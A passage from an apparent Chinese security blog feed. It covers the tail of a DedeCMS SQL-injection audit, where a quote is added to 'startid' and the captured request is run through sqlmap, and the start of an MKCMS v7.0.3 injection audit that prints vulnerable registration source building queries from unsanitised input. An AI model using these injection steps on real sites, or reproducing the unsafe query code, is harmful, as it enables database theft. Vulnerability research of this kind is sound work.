PHPSESSID&#x3D;mrb3nr8o749ivis4ht88l6l0bg; _csrf_name_82f99071&#x3D;034d348b605717cf5b1cd83a1d8b8bd8; _csrf_name_82f99071__ckMd5&#x3D;72f306a6331ccc26; DedeUserID&#x3D;1; DedeUserID__ckMd5&#x3D;8e635ad267f5c9bb; DedeLoginTime&#x3D;1616745752; DedeLoginTime__ckMd5&#x3D;d8bf0218bdaada0b</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>Resend the original packet<br><img src="https://img.imgdb.cn/item/605dac3c8322e6675c7413e3.png"></p><p>Add <code>&#39;</code>after <code>startid</code>.See the <code>render</code>.Something is different, which means the database is responding<br><img src="https://img.imgdb.cn/item/605dacce8322e6675c746ffd.png"></p><p>Now, drop the raw packet into <code>sqlmap</code>,It’s worth noting that there are two hints,<strong>I select no</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie parameter &#39;_csrf_name_82f99071&#39; appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y&#x2F;N] n</span><br><span class="line">Cookie parameter &#39;_csrf_name_82f99071__ckMd5&#39; appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y&#x2F;N] n</span><br></pre></td></tr></table></figure><p>The end result<br><img src="https://img.imgdb.cn/item/605dade18322e6675c751a47.png"></p><p>We can also try to get the database<br><img src="https://img.imgdb.cn/item/605dae3b8322e6675c75593b.png"></p>]]></content>
    
    
    <summary type="html">dedecms最新版代码审计</summary>
    
    
    
    <category term="代码审计" scheme="http://nice759.com/Categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="php" scheme="http://nice759.com/tags/php/"/>
    
    <category term="代码审计" scheme="http://nice759.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>米酷CMS v7.0.3 sql注入漏洞审计及本地复现</title>
    <link href="http://nice759.com/2021/03/24/%E7%B1%B3%E9%85%B7CMS%20v7.0.3%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0/"/>
    <id>http://nice759.com/2021/03/24/%E7%B1%B3%E9%85%B7CMS%20v7.0.3%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-03-24T02:28:15.000Z</published>
    <updated>2021-03-24T03:43:37.419Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>米酷影视管理系统是一套专为不同需求的站长而设计的影视管理系统，灵活，方便，人性化设计简单易用是最大的特色，是快速架设视频网站首选，只需 3 分钟即可建立一个海量的视频讯息的行业网站。<br><a href="https://www.mkcms.com/">米酷CMS v7.0.3</a>版本<code>admin/model/admin_edit.php</code>、<code>ucenter/reg.php</code>等文件存在漏洞，攻击者可以利用漏洞进行sql注入攻击。</p><h1 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h1><p>米酷CMS v7.0.3</p><h1 id="第一处注入"><a href="#第一处注入" class="headerlink" title="第一处注入"></a>第一处注入</h1><ul><li><strong>漏洞文件</strong><br><code>ucenter/reg.php</code> （前台文件）</li><li><strong>分析</strong><br>在<code>reg.php</code>这个文件中，第9行处对<code>$username</code>这个参数进行了查询拼接<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include(&#39;..&#x2F;system&#x2F;inc.php&#39;);</span><br><span class="line">if(isset($_SESSION[&#39;user_name&#39;]))&#123;</span><br><span class="line">header(&#39;location:index.php&#39;);</span><br><span class="line">&#125;;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">$username &#x3D; stripslashes(trim($_POST[&#39;name&#39;]));</span><br><span class="line">&#x2F;&#x2F; 检测用户名是否存在</span><br><span class="line">$query &#x3D; mysqli_query($conn,&quot;select u_id from mkcms_user where u_name&#x3D;&#39;$username&#39;&quot;);</span><br><span class="line">if(mysqli_fetch_array($query))&#123;</span><br><span class="line">echo &#39;&lt;script&gt;alert(&quot;用户名已存在，请换个其他的用户名&quot;);window.history.go(-1);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">$result &#x3D; mysqli_query($conn,&#39;select * from mkcms_user where u_email &#x3D; &quot;&#39;.$_POST[&#39;email&#39;].&#39;&quot;&#39;);</span><br><span class="line">if(mysqli_fetch_array($result))&#123;</span><br><span class="line">echo &#39;&lt;script&gt;alert(&quot;邮箱已存在，请换个其他的邮箱&quot;);window.history.go(-1);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">$password &#x3D; md5(trim($_POST[&#39;password&#39;]));</span><br><span class="line">$email &#x3D; trim($_POST[&#39;email&#39;]);</span><br><span class="line">$regtime &#x3D; time();</span><br><span class="line">$token &#x3D; md5($username.$password.$regtime); &#x2F;&#x2F;创建用于激活识别码</span><br><span class="line">$token_exptime &#x3D; time()+60*60*24;&#x2F;&#x2F;过期时间为24小时后</span><br><span class="line">$data[&#39;u_name&#39;] &#x3D; $username;</span><br><span class="line">$data[&#39;u_password&#39;] &#x3D;$password;</span><br><span class="line">$data[&#39;u_email&#39;] &#x3D; $email;</span><br><span class="line">$data[&#39;u_regtime&#39;] &#x3D;$regtime;</span><br><span class="line">if($mkcms_mail&#x3D;&#x3D;1)&#123;</span><br><span class="line">$data[&#39;u_status&#39;] &#x3D;0;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$data[&#39;u_status&#39;] &#x3D;1;</span><br><span class="line">&#125;</span><br><span class="line">$data[&#39;u_group&#39;] &#x3D;1;</span><br><span class="line">$data[&#39;u_fav&#39;] &#x3D;0;</span><br><span class="line">$data[&#39;u_plays&#39;] &#x3D;0;</span><br><span class="line">$data[&#39;u_downs&#39;] &#x3D;0;</span><br><span class="line">&#x2F;&#x2F;推广注册</span><br><span class="line">if (isset($_GET[&#39;tg&#39;])) &#123;</span><br><span class="line">$data[&#39;u_qid&#39;] &#x3D;$_GET[&#39;tg&#39;];</span><br><span class="line">$result &#x3D; mysqli_query($conn,&#39;select * from mkcms_user where u_id&#x3D;&quot;&#39;.$_GET[&#39;tg&#39;].&#39;&quot;&#39;);</span><br><span class="line">if($row &#x3D; mysqli_fetch_array($result))&#123;</span><br><span class="line"></span><br><span class="line">$u_points&#x3D;$row[&#39;u_points&#39;];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$_data[&#39;u_points&#39;] &#x3D;$u_points+$mkcms_tuiguang;</span><br><span class="line">$sql &#x3D; &#39;update mkcms_user set &#39;.arrtoupdate($_data).&#39; where u_id&#x3D;&quot;&#39;.$_GET[&#39;tg&#39;].&#39;&quot;&#39;;</span><br><span class="line">if (mysqli_query($conn,$sql)) &#123;&#125;</span><br><span class="line">$data[&#39;u_question&#39;] &#x3D;$token;</span><br><span class="line">$str &#x3D; arrtoinsert($data);</span><br><span class="line">$sql &#x3D; &#39;insert into mkcms_user (&#39;.$str[0].&#39;) values (&#39;.$str[1].&#39;)&#39;;</span><br><span class="line">if (mysqli_query($conn,$sql)) &#123;</span><br><span class="line">if($mkcms_mail&#x3D;&#x3D;1)&#123;</span><br><span class="line">&#x2F;&#x2F;写入数据库成功，发邮件</span><br><span class="line">include(&quot;emailconfig.php&quot;);</span><br><span class="line">    &#x2F;&#x2F;创建$smtp对象 这里面的一个true是表示使用身份验证,否则不使用身份验证.</span><br><span class="line">    $smtp &#x3D; new Smtp($MailServer, $MailPort, $smtpuser, $smtppass, true); </span><br><span class="line">    $smtp-&gt;debug &#x3D; false; </span><br><span class="line">    $mailType &#x3D; &quot;HTML&quot;; &#x2F;&#x2F;信件类型，文本:text；网页：HTML</span><br><span class="line">    $email &#x3D; $email;  &#x2F;&#x2F;收件人邮箱</span><br><span class="line">    $emailTitle &#x3D; &quot;&quot;.$mkcms_name.&quot;用户账号激活&quot;; &#x2F;&#x2F;邮件主题</span><br><span class="line">    $emailBody &#x3D; &quot;亲爱的&quot;.$username.&quot;：&lt;br&#x2F;&gt;感谢您在我站注册了新账号。&lt;br&#x2F;&gt;请点击链接激活您的账号。&lt;br&#x2F;&gt;&lt;a href&#x3D;&#39;&quot;.$mkcms_domain.&quot;ucenter&#x2F;active.php?verify&#x3D;&quot;.$token.&quot;&#39; target&#x3D;&#39;_blank&#39;&gt;&quot;.$mkcms_domain.&quot;ucenter&#x2F;active.php?verify&#x3D;&quot;.$token.&quot;&lt;&#x2F;a&gt;&lt;br&#x2F;&gt;如果以上链接无法点击，请将它复制到你的浏览器地址栏中进入访问，该链接24小时内有效。&lt;br&#x2F;&gt;如果此次激活请求非你本人所发，请忽略本邮件。&lt;br&#x2F;&gt;&lt;p style&#x3D;&#39;text-align:right&#39;&gt;-------- &quot;.$mkcms_name.&quot; 敬上&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; sendmail方法</span><br><span class="line">    &#x2F;&#x2F; 参数1是收件人邮箱</span><br><span class="line">    &#x2F;&#x2F; 参数2是发件人邮箱</span><br><span class="line">    &#x2F;&#x2F; 参数3是主题（标题）</span><br><span class="line">    &#x2F;&#x2F; 参数4是邮件主题（标题）</span><br><span class="line">    &#x2F;&#x2F; 参数4是邮件内容  参数是内容类型文本:text 网页:HTML</span><br><span class="line">    $rs &#x3D; $smtp-&gt;sendmail($email, $smtpMail, $emailTitle, $emailBody, $mailType);</span><br><span class="line">if($rs&#x3D;&#x3D;true)&#123;</span><br><span class="line">echo &#39;&lt;script&gt;alert(&quot;恭喜您，注册成功！请登录到您的邮箱及时激活您的账号！&quot;);window.history.go(-1);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &#39;&lt;script&gt;alert(&quot;恭喜您，注册成功！&quot;);window.history.go(-1);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if($mkcms_smsname!&#x3D;&quot;&quot;)&#123;</span><br><span class="line">if($_POST[&#39;txtsmscode&#39;]&#x3D;&#x3D;&quot;&quot; || $_POST[&#39;txtsmscode&#39;]!&#x3D;$_SESSION[&#39;mobilecode&#39;])&#123;</span><br><span class="line">echo &quot;&lt;script type&#x3D;&#39;text&#x2F;javascript&#39;&gt;alert(&#39;短信验证码不能为空！&#39;);history.go(-1);&lt;&#x2F;script&gt;&quot;; </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &#39;&lt;script&gt;alert(&quot;恭喜您，注册成功！&quot;);window.history.go(-1);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php include(&#39;..&#x2F;template&#x2F;&#39;.$mkcms_bdyun.&#39;&#x2F;head.php&#39;);?&gt;</span><br><span class="line">&lt;title&gt;会员登录-&lt;?php echo $mkcms_seoname;?&gt;&lt;&#x2F;title&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;keywords&quot; content&#x3D;&quot;&lt;?php echo $mkcms_keywords;?&gt;&quot;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&lt;?php echo $mkcms_description;?&gt;&quot;&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; media&#x3D;&quot;screen&quot; href&#x3D;&quot;css&#x2F;main.css&quot; &#x2F;&gt;</span><br><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">.p-imgcon &#123;margin-top: -30px;height: 500px;background-color: #e6e6e6;background: #fff url(&lt;?php</span><br><span class="line">$text&#x3D;file_get_contents(&#39;https:&#x2F;&#x2F;i.360kan.com&#x2F;login&#39;); </span><br><span class="line">$link&#x3D;&quot;#&lt;a href&#x3D;&#39;https:&#x2F;&#x2F;www.360kan.com&#x2F;(.*?)&#39;&gt;&lt;&#x2F;a&gt;#&quot;;</span><br><span class="line">preg_match_all($link,$text,$sarr);</span><br><span class="line">$link1&#x3D;$sarr[1][0];</span><br><span class="line">$link2&#x3D;&quot;&#x2F;vod&#x2F;&quot;.$link1;</span><br><span class="line">preg_match(&#39;&#x2F;https[^&gt;]*jpg&#x2F;Ui&#39;, $text, $match);</span><br><span class="line">print($match[0]);</span><br><span class="line">?&gt;) center 0 no-repeat;&#125;</span><br><span class="line">.login-section &#123;margin: 30px 15px 0 auto;&#125;</span><br><span class="line">@media (max-width: 768px)&#123; #imgcon1&#123;display:none;&#125;&#125;</span><br><span class="line">#imgcon1 a&#123; display:block; width:48%;height:500px; position:absolute;z-index:999;&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;!--[if lt IE 9]&gt;    </span><br><span class="line">&lt;script src&#x3D;&quot;..&#x2F;style&#x2F;js&#x2F;html5shiv.js&quot;&gt;&lt;&#x2F;script&gt;   </span><br><span class="line">&lt;script src&#x3D;&quot;..&#x2F;style&#x2F;js&#x2F;respond.min.js&quot;&gt;&lt;&#x2F;script&gt;  </span><br><span class="line">&lt;![endif]--&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">function chk_form()&#123;</span><br><span class="line">var tel &#x3D; document.getElementById(&quot;tel&quot;);</span><br><span class="line">if(tel.value&#x3D;&#x3D;&quot;&quot;)&#123;</span><br><span class="line">alert(&quot;用户名不能为空！&quot;);</span><br><span class="line">return false;</span><br><span class="line">&#x2F;&#x2F;user.focus();</span><br><span class="line">&#125;</span><br><span class="line">var pass &#x3D; document.getElementById(&quot;pass&quot;);</span><br><span class="line">if(pass.value&#x3D;&#x3D;&quot;&quot;)&#123;</span><br><span class="line">alert(&quot;密码不能为空！&quot;);</span><br><span class="line">return false;</span><br><span class="line">&#x2F;&#x2F;pass.focus();</span><br><span class="line">&#125;</span><br><span class="line">var email &#x3D; document.getElementById(&quot;email&quot;);</span><br><span class="line">if(email.value&#x3D;&#x3D;&quot;&quot;)&#123;</span><br><span class="line">alert(&quot;Email不能为空！&quot;);</span><br><span class="line">return false;</span><br><span class="line">&#x2F;&#x2F;email.focus();</span><br><span class="line">&#125;</span><br><span class="line">var preg &#x3D; &#x2F;^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*&#x2F;; &#x2F;&#x2F;匹配Email</span><br><span class="line">if(!preg.test(email.value))&#123; </span><br><span class="line">alert(&quot;Email格式错误！&quot;);</span><br><span class="line">return false;</span><br><span class="line">&#x2F;&#x2F;email.focus();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">&#x2F;*-------------------------------------------*&#x2F;</span><br><span class="line">var InterValObj; &#x2F;&#x2F;timer变量，控制时间</span><br><span class="line">var count &#x3D; 60; &#x2F;&#x2F;间隔函数，1秒执行</span><br><span class="line">var curCount;&#x2F;&#x2F;当前剩余秒数</span><br><span class="line">var code &#x3D; &quot;&quot;; &#x2F;&#x2F;验证码</span><br><span class="line">var codeLength &#x3D; 6;&#x2F;&#x2F;验证码长度</span><br><span class="line">function sendMessage() &#123;</span><br><span class="line">curCount &#x3D; count;</span><br><span class="line">var dealType; &#x2F;&#x2F;验证方式</span><br><span class="line">tel &#x3D; $(&#39;#tel&#39;).val();</span><br><span class="line">    if(tel!&#x3D;&#39;&#39;)&#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;验证手机有效性</span><br><span class="line"> var myreg &#x3D; &#x2F;^(((13[0-9]&#123;1&#125;)|(15[0-9]&#123;1&#125;)|(17[0-9]&#123;1&#125;)|(14[0-9]&#123;1&#125;)|(18[0-9]&#123;1&#125;))+\d&#123;8&#125;)$&#x2F;; </span><br><span class="line">            if(!myreg.test($(&#39;#tel&#39;).val())) </span><br><span class="line">          &#123; </span><br><span class="line">             alert(&#39;请输入有效的手机号码！&#39;); </span><br><span class="line">             return false; </span><br><span class="line">          &#125; </span><br><span class="line">tel &#x3D; $(&#39;#tel&#39;).val();</span><br><span class="line">   &#x2F;&#x2F;产生验证码</span><br><span class="line">for (var i &#x3D; 0; i &lt; codeLength; i++) &#123;</span><br><span class="line">code +&#x3D; parseInt(Math.random() * 9).toString();</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;设置button效果，开始计时</span><br><span class="line">$(&quot;#btnSendCode&quot;).attr(&quot;disabled&quot;, &quot;true&quot;);</span><br><span class="line">$(&quot;#btnSendCode&quot;).val(&quot;请在&quot; + curCount + &quot;秒内输入&quot;);</span><br><span class="line">InterValObj &#x3D; window.setInterval(SetRemainTime, 1000); &#x2F;&#x2F;启动计时器，1秒执行一次</span><br><span class="line">&#x2F;&#x2F;向后台发送处理数据</span><br><span class="line">                $.ajax(&#123;</span><br><span class="line">                    type: &quot;POST&quot;, &#x2F;&#x2F;用POST方式传输</span><br><span class="line">                    dataType: &quot;text&quot;, &#x2F;&#x2F;数据格式:JSON</span><br><span class="line">                    url: &#39;&#x2F;ucenter&#x2F;yanzhengma.php&#39;, &#x2F;&#x2F;目标地址</span><br><span class="line">                    data: &quot;&amp;tel&#x3D;&quot; + tel + &quot;&amp;code&#x3D;&quot; + code,</span><br><span class="line">                    error: function (XMLHttpRequest, textStatus, errorThrown) &#123; &#125;,</span><br><span class="line">                    success: function (msg)&#123; &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">alert(&#39;请填写手机号码&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">&#x2F;&#x2F;timer处理函数</span><br><span class="line">function SetRemainTime() &#123;</span><br><span class="line">if (curCount &#x3D;&#x3D; 0) &#123;                </span><br><span class="line">window.clearInterval(InterValObj);&#x2F;&#x2F;停止计时器</span><br><span class="line">$(&quot;#btnSendCode&quot;).removeAttr(&quot;disabled&quot;);&#x2F;&#x2F;启用按钮</span><br><span class="line">$(&quot;#btnSendCode&quot;).val(&quot;重新发送验证码&quot;);</span><br><span class="line">code &#x3D; &quot;&quot;; &#x2F;&#x2F;清除验证码。如果不清除，过时间后，输入收到的验证码依然有效    </span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">curCount--;</span><br><span class="line">$(&quot;#btnSendCode&quot;).val(&quot;请在&quot; + curCount + &quot;秒内输入&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body style&#x3D;&quot;padding-top: 60px;&quot;&gt;</span><br><span class="line">&lt;?php include(&#39;..&#x2F;template&#x2F;&#39;.$mkcms_bdyun.&#39;&#x2F;header.php&#39;);?&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;imgcon1&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&lt;?php echo $link2;?&gt;&quot; target&#x3D;&quot;_blank&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;wrapper&quot; class&#x3D;&quot;pad-bottom p-imgcon&quot;&gt;</span><br><span class="line">   &lt;div id&#x3D;&quot;content-container&quot; class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;es-section login-section&quot;&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;logon-tab clearfix&quot;&gt;</span><br><span class="line">    &lt;a href&#x3D;&quot;login.php&quot;&gt;登录账号&lt;&#x2F;a&gt;</span><br><span class="line">    &lt;a class&#x3D;&quot;active&quot;&gt;注册账号&lt;&#x2F;a&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;login-main&quot;&gt;</span><br><span class="line">      &lt;form class&#x3D;&quot;form-horizontal js-ajax-form&quot;  method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return chk_form();&quot;&gt;</span><br><span class="line">   &lt;label class&#x3D;&quot;control-label required&quot;&gt;账号&lt;&#x2F;label&gt;</span><br><span class="line">       &lt;div class&#x3D;&quot;control-group&quot; style&#x3D;&quot;margin-bottom:10px;&quot;&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; id&#x3D;&quot;tel&quot; placeholder&#x3D;&quot;作为登录账号使用&quot; value&#x3D;&quot;&quot; class&#x3D;&quot;form-control input-lg span4&quot;&gt;</span><br><span class="line">   &lt;&#x2F;div&gt;</span><br><span class="line">   &lt;label class&#x3D;&quot;control-label required&quot; &gt;邮箱&lt;&#x2F;label&gt;</span><br><span class="line">       &lt;div class&#x3D;&quot;control-group&quot; style&#x3D;&quot;margin-bottom:10px;&quot;&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;email&quot; id&#x3D;&quot;email&quot; placeholder&#x3D;&quot;邮箱&quot; class&#x3D;&quot;form-control input-lg span4&quot;&gt;</span><br><span class="line">   &lt;&#x2F;div&gt;</span><br><span class="line">&lt;?php if($mkcms_smsname!&#x3D;&quot;&quot;)&#123;?&gt;</span><br><span class="line">&lt;label class&#x3D;&quot;control-label required&quot; &gt;手机验证码&lt;&#x2F;label&gt; </span><br><span class="line">&lt;div class&#x3D;&quot;control-group&quot; style&#x3D;&quot;margin-bottom:10px;&quot;&gt; </span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;txtsmscode&quot; id&#x3D;&quot;txtsmscode&quot; placeholder&#x3D;&quot;点击右侧获取&quot; class&#x3D;&quot;form-control input-lg span4&quot; style&#x3D;&quot;width:200px;float:left;margin-right:5px;&quot;&gt;</span><br><span class="line"> &lt;input id&#x3D;&quot;btnSendCode&quot; class&#x3D;&quot;form-control input-lg js-ajax-dialog-btn&quot; type&#x3D;&quot;button&quot; value&#x3D;&quot;获取验证码&quot; onclick&#x3D;&quot;sendMessage()&quot; style&#x3D;&quot;width:130px&quot; &#x2F;&gt; &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php &#125;?&gt;   </span><br><span class="line">   &lt;label class&#x3D;&quot;control-label required&quot; &gt;密码&lt;&#x2F;label&gt;</span><br><span class="line">   &lt;div class&#x3D;&quot;control-group&quot; style&#x3D;&quot;margin-bottom:10px;&quot;&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; id&#x3D;&quot;pass&quot; placeholder&#x3D;&quot;登陆密码,请牢记!&quot; class&#x3D;&quot;form-control input-lg span4&quot;&gt;</span><br><span class="line">   &lt;&#x2F;div&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;div class&#x3D;&quot;control-group&quot;&gt;</span><br><span class="line">&lt;button class&#x3D;&quot;btn btn-primary js-ajax-submit btn-lg btn-block&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; data-wait&#x3D;&quot;1500&quot; style&#x3D;&quot;margin-left: 0px;margin-top:30px;width: 100%;&quot;&gt;确定注册&lt;&#x2F;button&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">     &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">   &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt; </span><br><span class="line">&lt;?php include(&#39;..&#x2F;template&#x2F;&#39;.$mkcms_bdyun.&#39;&#x2F;footer.php&#39;);?&gt; </span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span 